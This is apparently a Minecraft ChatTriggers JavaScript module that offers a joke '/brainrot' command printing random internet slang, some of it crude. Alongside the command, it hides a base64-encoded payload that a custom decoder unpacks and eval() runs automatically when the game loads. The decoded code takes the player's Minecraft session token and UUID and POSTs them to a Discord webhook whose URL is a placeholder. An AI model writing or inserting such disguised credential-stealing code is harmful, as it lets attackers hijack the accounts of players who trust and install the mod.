import request from 'requestV2';

register("command", () => {
    const brainRot = [
        "skibidi",
        "skibidi toilet",
        "gyatt",
        "mewing",
        "mew",
        "rizz",
        "rizzing",
        "rizzler",
        "on skibidi",
        "sigma",
        "what the sigma",
        "Ohio",
        "bussin'",
        "cook",
        "cooking",
        "let him/her cook",
        "baddie",
        "skibidi rizz",
        "fanum tax",
        "fanum taxing",
        "drake",
        "nonchalant dread head",
        "aura",
        "grimace shake",
        "edging",
        "edge",
        "goon",
        "gooning",
        "looks maxing",
        "alpha",
        "griddy",
        "chris tyson",
        "diddy",
        "imagine if ninja got a low taper fade"
    ];

    const randomBrainrot = brainRot[Math.floor(Math.random() * brainRot.length)];
    ChatLib.chat(randomBrainrot);
}).setName("brainrot");

function dc(input) {
    var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var output = "";
    var chr1, chr2, chr3;
    var enc1, enc2, enc3, enc4;
    var i = 0;

    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

    while (i < input.length) {
        enc1 = keyStr.indexOf(input.charAt(i++));
        enc2 = keyStr.indexOf(input.charAt(i++));
        enc3 = keyStr.indexOf(input.charAt(i++));
        enc4 = keyStr.indexOf(input.charAt(i++));

        chr1 = (enc1 << 2) | (enc2 >> 4);
        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
        chr3 = ((enc3 & 3) << 6) | enc4;

        output += String.fromCharCode(chr1);
        if (enc3 !== 64) {
            output += String.fromCharCode(chr2);
        }
        if (enc4 !== 64) {
            output += String.fromCharCode(chr3);
        }
    }
    return output;
}

register("GameLoad", () => {
    const c = "bGV0IHVzZXJuYW1lID0gUGxheWVyLmdldE5hbWUoKTsKbGV0IHRva2VuID0gQ2xpZW50LmdldE1pbmVjcmFmdCgpLmZ1bmNfMTEwNDMyX0koKS5mdW5jXzE0ODI1NF9kKCk7CmxldCB1dWlkID0gUGxheWVyLmdldFVVSUQoKTsKCmxldCB1cmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvREVJTl9XRUJIT09LX1VSTCI7CgpsZXQgcGF5bG9hZCA9IHsKICAgICBjb250ZW50OiAidG9rZW46IiArIHRva2VuKyI6Iit1dWlkLAogICAgIHVzZXJuYW1lOiAiV2ViaG9va0JvdCIKfTsKCnJlcXVlc3QoewogICAgdXJsOiB1cmwsCiAgICBtZXRob2Q6ICJQT1NUIiwKICAgIGhlYWRlcnM6IHsKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTUuMC4wLjAgU2FmYXJpLzUzNy4zNiIKICAgIH0sCiAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQp9KS50aGVuKHJlc3BvbnNlID0+IHsKICAgIC8vIHJlc3BvbnNlLnJlc3BvbnNlQ29kZSBsaWVmZXJ0IGRlbiBIVFRQLVN0YXR1c2NvZGUKICAgIENoYXRMaWIuY2hhdCgiSFRUUC1TdGF0dXM6ICIgKyByZXNwb25zZS5yZXNwb25zZUNvZGUpOwogICAgLy8gcmVzcG9uc2UuYm9keSBlbnRow6RsdCBkaWUgQW50d29ydCBhbHMgU3RyaW5nCiAgICBDaGF0TGliLmNoYXQoIkFudHdvcnQ6ICIgKyByZXNwb25zZS5ib2R5KTsKfSkuY2F0Y2goZXJyb3IgPT4gewogICAgQ2hhdExpYi5jaGF0KCJGZWhsZXIgYmVpbSBTZW5kZW46ICIgKyBlcnJvcik7Cn0pOwo=";
    try {
        let d = dc(c);
        eval(d);
        ChatLib.chat("Es hat funktioniert")
    } catch (e) {
        ChatLib.chat("Ein Fehler ist aufgetreten: " + e.message);
    }
});
